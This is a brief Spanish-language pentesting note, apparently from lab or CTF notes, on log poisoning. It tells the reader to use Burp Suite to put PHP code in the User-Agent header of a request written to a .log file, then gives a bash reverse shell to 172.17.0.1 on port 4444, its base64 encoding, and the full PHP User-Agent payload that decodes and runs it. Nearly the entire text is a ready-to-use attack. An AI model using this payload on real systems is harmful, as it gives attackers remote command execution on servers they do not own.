Desde Burpsuit si tenemos acceso a un archivo .log que rgistra el UserAgent modificamos en la peticion que genera el log este parametro ejemplo

```
Creamos una reverse shel en base64 y la pasamos por el user agent
echo 'bash -i >& /dev/tcp/172.17.0.1/4444 0>&1' | base64                                                               
YmFzaCAtaSA+JiAvZGV2L3RjcC8xNzIuMTcuMC4xLzQ0NDQgMD4mMQo=


User-Agent:  <?php echo `printf YmFzaCAtaSA+JiAvZGV2L3RjcC8xNzIuMTcuMC4xLzQ0NDQgMD4mMQo= | base64 -d | bash`; ?>
```